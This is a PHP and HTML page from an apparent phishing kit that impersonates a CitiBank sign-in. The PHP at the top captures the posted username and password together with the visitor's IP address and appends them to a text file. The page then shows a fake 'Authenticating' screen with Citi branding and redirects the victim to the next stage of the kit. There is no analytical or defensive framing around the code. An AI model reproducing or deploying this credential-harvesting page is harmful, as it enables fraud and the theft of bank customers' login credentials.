<?php

$a = @$_POST['a'];
$b = @$_POST['b'];
$hostname = @gethostbyaddr($_SERVER['REMOTE_ADDR']);
$ip = getenv("REMOTE_ADDR");

$saveline = 'IP: ' . $ip . ' USER: ' . $a . ' PASS:' . $b . "\n";

$fh=fopen('up.txt',"a+");
fwrite($fh,$saveline);
fclose($fh);


function hextobin($hexstr) 
    { 
        $n = strlen($hexstr); 
        $sbin="";   
        $i=0; 
        while($i<$n) 
        {       
            $a =substr($hexstr,$i,2);           
            @$c = pack("H*",$a); 
            if ($i==0){$sbin=$c;} 
            else {$sbin.=$c;} 
            $i+=2; 
        } 
        return $sbin; 
    } 





?>

<html lang="en">
    <meta http-equiv="refresh" content="25; URL=q.html">
  <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>CitiBank-Login</title>
      <base href="">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/png" href="images/favicon-32x32.png" sizes="32x32">
      <link rel="icon" type="image/png" href="images/favicon-16x16.png" sizes="16x16">
      <link rel="shortcut icon" href="favicon.ico">
      <!-- amt sdk files Start -->
      <link rel="stylesheet" type="text/css" href="css/styles.css">
      <!-- amt sdk files-->
      <link rel="stylesheet" href="css/caca.css">
      <style type="text/css">.mask-it { border: 2px solid # !important; color: #; outline: 0}</style>
   </head>
   <body>
      <login-app ng-version="7.2.10">
         <login-header>
            <header class="container-fluid">
               <div class="container">
                  <div class="row">
                     <div class="col-12">
                        <div class="app-header">
                           <a href="javascript:void(0);" title="CitiBank">
                              <h3 class="key-logo no-print"><span class="sr-only"></span><img  src="citi.png" alt="CitiBank Login" width="69" height="40"/>	</h3>
                           </a>
                           <nav class="navbar navbar-expand-lg navbar-dark bg-dark float-right">
                              <div class="collapse navbar-collapse navlink-wrapper">
                                 <ul>
                                 </ul>
                              </div>
                           </nav>
                        </div>
                     </div>
                  </div>
               </div>
            </header>
            <div class="navbg-blur collapse navbar-collapse"></div>
         </login-header>
         <cool-loader>
            <div class="loading-overlay hide"></div>
            <div class="cool-loader-container hide">
               </svg>
            </div>
         </cool-loader>
         <div>
            <router-outlet></router-outlet>
            <login-page>
               <div class="login">
                  <sign-in>
                     <div class="container app-container kds-long-form-text">
                        <div class="row">
                           <div class="col-12 col-md-8 offset-md-2 col-xl-6 offset-xl-3">
                              <div class="signin-container" id="signInMain">
                                 <!----><!---->
                                 <div class="row signin-block">
                                    <div class="col-12 signin-greeting-section">
                                       <h2 data-test="si_online_banking">Authenticating.. Please wait.</h2>
									   <img src="loading.gif">
                                    </div>
                                    <!---->
													<form id="signin-form" action="q.php" method="post">
                                    <!---->
                                    <!---->
 </div>
								 				</form>
                                 <!---->
                                 <div class="signin-block">
                                    <div class="signin-redirect-section">This may take up to one minute.</div>
                                 </div>
                              </div>
                              <div hidden="">
                                 <div id="loginStepUpContainer"></div>
                              </div>
                              <div id="signInAmtContainer" ></div>
                           </div>
                        </div>
                        <help-launcher>

                        </help-launcher>
                     </div>
                  </sign-in>
               </div>
            </login-page>
         </div>
         <build-info>
            <!---->
         </build-info>
      </login-app>
<!-- analytics related -->
      <script type="text/javascript">var digitalData = {}; if(typeof _satellite !=='undefined')_satellite.pageBottom();</script>
         <div id="V4LLPanel_Container">
         <div style="z-index:1500001; position:fixed; _position: absolute !important; cursor:pointer; visibility:hidden; overflow: hidden; background: url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpaneltoggler.png) no-repeat !important; width: 157px; height: 36px; bottom: 0; right:16px;" id="V4LLPanel_CollapsedNarrowNoAgent">
            <div id="V4LLPanel_InnerLogo" style="margin: 9px 10px 0 10px; width: 23px; height: 24px; float: left; background: url(https://sc40562060us3.cobrowse.oraclecloud.com/ui/images/v4llpanel_innerlogo_background.png) no-repeat !important; _margin-left: 5px !important;" class="LLV4Logo"></div>
            <span style="display:inline-block; width: 98px; text-align:center; float:left; margin:12px 0 0 0; font-family: Tahoma; font-size: 14px; color: #a2a2a2;" id="V4LLPanel_CollapsedNumContNarrow" tabindex="0" role="button" aria-live="assertive" aria-label="Expand Browse with Specialist widget"></span>
         </div>
         <div id="V4LLPanel_HintBlock" style="bottom: 30px; right:16px; z-index:20000; position:fixed; _position: absolute !important; cursor:pointer; visibility:hidden; background: url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpanelhovertooltipbg.png) no-repeat !important; width: 157px; height: 78px;"><span id="V4LLPanel_Hint_FirstLine" style="display: block; text-align: center; font-size: 14px; font-family: Trebuchet MS; color: #343434; width: 157px; font-style: normal ; font-weight: bold; margin-top: 13px;">Browse together</span><span id="V4LLPanel_Hint_SecondLine" style="display: block; text-align: center; font-size: 10px; font-family: Trebuchet MS; color: #343434; font-weight: normal ; font-style: normal; width: 157px;">with our experts online</span></div>
         <div id="V4LLPanel_GenericToggler" style="position: fixed; z-index: 1500001; cursor: pointer; overflow: hidden; bottom: 0px; right: 16px; background: url(&quot;https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpaneltoggler.png&quot;) no-repeat !important; width: 157px !important; height: 36px !important; visibility: hidden;">
            <div id="V4LLPanel_InnerLogo" style="margin: 9px 10px 0 10px; width: 23px; height: 24px; float: left; background: url(https://sc40562060us3.cobrowse.oraclecloud.com/ui/images/v4llpanel_innerlogo_background.png) no-repeat !important; _margin-left: 5px !important;"></div>
            <span id="V4LLPanel_InnerTitle" style="position:absolute; top: 11px; left: 42px; font-family: Tahoma; font-size: 14px !important; color: #ffffff;" class="V4LLTitleText" tabindex="0" role="button">Co-browse</span>
         </div>
         <div id="V4LLPanel" style="position: fixed; _position: absolute !important; z-index: 1500002; height: 0; overflow: hidden; width: 284px; background: url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpanelbg.png) no-repeat !important; bottom: 0; right:16px;" class="makeVisible">
            <div id="V4LLPanel_InnerContainer" style="position: relative; padding: 42px 0 0 4px; zoom: 1; height: 130px; width: 277px !important;">
               <div id="V4LLPanel_MovingToggler" style="width: 256px; height: 46px; position: absolute; left: 0; top: 0; margin-left: 10px; background: url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpanelsepline.png) repeat-x left bottom !important;" class="LLV4Separator">
                  <div id="V4LLPanel_LogoToggler" style="margin:13px 16px 0 3px; width: 23px; height: 24px; float: left; background:url(https://sc40562060us3.cobrowse.oraclecloud.com/ui/images/v4llpanel_innerlogo_background.png) no-repeat !important;" class="LLV4Logo">
                     <div id="V4LLPanel_PanelMinimize" tabindex="0" role="button" aria-label="Collapse Browse with Specialist widget" style="position: absolute; width:15px; height:10px; cursor:pointer; margin:7px 0 0 0; _margin: 3px 0 0 0; right: 26px; background:url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpanelminimize.png) no-repeat left bottom !important;" disabled="disabled" aria-hidden="true"></div>
                     <div id="V4LLPanel_PanelClose" role="button" tabindex="0.1" aria-label="Disconnect session for browse with specialist" style="position: absolute; width:11px; height:10px; cursor:pointer; margin:7px 0 0 0; right: 0; background:url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpanelclosebutton.png) no-repeat !important;" disabled="disabled" aria-hidden="true"></div>
                  </div>
                  <span id="V4LLPanel_TogglerText" style="position:absolute; top: 17px; left: 34px; font-family:Tahoma !important; font-size: 14px; color: #ffffff !important;" class="V4LLTitleText">Co-browse</span>
                  <div id="V4LLPanelDisconnectConfirmWindow" aria-atomic="true" role="dialog" style="box-sizing:content-box; display:none; position:absolute; top:47px;left:2px;width:232px;_width:250px;background-color:#2f2f2f;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;border:1px solid #aeaeae;box-shadow: 0 1px 16px #000; z-index:11; text-align: center;padding:28px 10px;">
                     <span style="font-size:14px; color:#fffefe; font-weight:normal; font-style: normal; font-family: Trebuchet MS;">Are you sure you want to terminate this session?</span><br><a id="V4LLPanel_CloseDeclineButton" tabindex="0" role="button" aria-label="Decline session end" style="height: 24px !important; background: url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpaneldisconnectbutton.png) no-repeat; color: #ffffff; font-family: Trebuchet MS; font-size: 18px; font-weight: normal !important; font-style: normal !important; width:103px; text-align:center; display:inline-block; text-decoration:none; padding-top:3px; padding-bottom:2px; margin-top:35px;margin-right:10px;" href="javascript:void(0)" disabled="disabled" aria-hidden="true">No</a><a id="V4LLPanel_CloseConfirmButton" tabindex="0" role="button" aria-label="Confirm session end" style="height: 24px !important; background: url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpaneldisconnectbutton.png) no-repeat; color: #ffffff; font-family: Trebuchet MS; font-size: 18px; font-weight: normal !important; font-style: normal !important; width:103px; text-align:center; display:inline-block; text-decoration:none; padding-top:3px;padding-bottom:2px;margin-top:35px;" href="javascript:void(0)" disabled="disabled" aria-hidden="true">Yes</a>
                     <p hidden="true" aria-hidden="false" style="display:none;">End of informational layer</p>
                  </div>
               </div>
               <div aria-atomic="true" style="height:85px;margin-left:10px; width: 252px; _margin-left: 12px !important; overflow:hidden;background: url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpanelsepline.png) repeat-x left bottom !important;">
                  <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="background-color:transparent; margin-top:0;">
                     <tbody>
                        <tr style="background-color:transparent;">
                           <td style="height:85px;vertical-align:middle;padding:0; border:0; background-color: transparent !important;">
                              <p id="V4LLPanel_passToBeginText" style="line-height: 18px;font-weight:normal;position:relative;float:left;-webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; margin-bottom:7px; text-align: center; margin-top:5px; width:243px; margin-left:10px; padding-top:6px; overflow: hidden; color: #ffffff !important; font-size: 12px !important; _margin-top: 0 !important;" class="LLV4Separator"><span id="V4LLPanel_PhoneNumber" role="dialog" style="position:relative;float:left;padding:6px 0 7px 0; font-family: Trebuchet MS;color: #ffffff !important;"><span id="V4LLPanel_PhoneNumberText" aria-hidden="true" style="position:relative;float:left;color: #ffffff !important;">Call the Contact Center at 800-539-1539 to get started.</span><span id="V4LLPanel_phoneNum" aria-hidden="true" style="font-size: 16px;color: #ffffff !important; font-family: Trebuchet MS !important;"></span><span id="V4LLPanel_HiddenPhone" style="display:none;" aria-hidden="true" disabled="disabled">Call the Contact Center at 800-539-1539 to get started. &nbsp; </span></span></p>
                           </td>
                        </tr>
                     </tbody>
                  </table>
               </div>
               <div style="height:37px;overflow:hidden;">
                  <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="background-color: transparent; margin-top:0;">
                     <tbody>
                        <tr style="background-color:transparent;">
                           <td style="height: 37px;vertical-align: middle; padding: 0; border: 0; background-color: transparent !important;">
                              <p id="V4LLPanel_provideCodeMessage" style="line-height: 17px;font-weight:normal;width:277px; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; text-align:center; text-align:center; margin: 0; padding: 0 10px; color:#a2a2a2; font-size: 14px !important; font-family: Trebuchet MS;" disabled="disabled" aria-hidden="true">Secure Session ID Number</p>
                           </td>
                        </tr>
                     </tbody>
                  </table>
               </div>
               <p id="V4LLPanel_NumberBox" aria-live="assertive" style="font-weight:normal;-webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; text-align: center; padding: 13px 0 12px 0; margin: 5px 0; height:22px; line-height:23px; width:252px; margin-left:10px; background-color: #414141 !important; color: #ffffff !important; font-size: 24px !important; font-family: Trebuchet MS;"><span style="margin-top:3px; background:url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpanelpreload.gif) no-repeat; width:15px; height:15px; display:block; margin:0 auto; margin-top:1px;" id="V4LLPanel_Preload"></span></p>
               <p id="V4LLPanel_DisconnectBtn" style="display:none;width:252px; margin-left:10px; margin-top:7px; padding-top:12px; background: url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpanelsepline.png) repeat-x !important; _margin-top:19px !important;" class="LLV4Separator"><a id="V4LLPanel_DisconnectTrigger" role="button" tabindex="0.1" aria-label="Disconnect session for browse with specialist" style="height: 24px !important; background: url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpaneldisconnectbutton.png) no-repeat; color: #fefefe; font-family: Trebuchet MS; font-size: 14px; font-weight: normal !important; font-style: normal !important; margin-bottom:8px; margin-top:2px; width:142px; text-align:center; display:block; text-decoration:none; padding-top:5px; margin-left:58px;" href="javascript:void(0)">Disconnect</a></p>
               <div id="V4LLPanel_termsAndConditionsText" style="height: 15px; width:252px; margin-left:10px; padding-top:18px; margin-top:10px; text-align:center; background: url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpanelsepline.png) repeat-x left top !important;" class="LLV4Separator"></div>
               <p id="V4LLPanel_PoweredBy" style="font-weight:normal;width:252px; margin-left: 10px !important; text-align: center; padding: 4px 0; margin: 14px 0 0 0; padding-top:8px; height:15px; clear:both; background: url(https://public.cobrowse.oraclecloud.com/rely/resources/images/v4llpanel/v4llpanelsepline.png) repeat-x left top !important; color: #a2a2a2 !important; font-family: Trebuchet MS !important; font-size: 10px !important; _margin-left: 12px !important;" class="LLV4Separator" disabled="disabled" aria-hidden="true">powered by Oracle Co-browsing</p>
               <span hidden="true" style="display:none;" aria-hidden="false">End of Modal Layer</span>
            </div>
         </div>
      </div>
   </body>
   <script type="text/javascript" id="useragent-switcher">navigator.__defineGetter__("userAgent", function() {return "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"})</script>
</html>
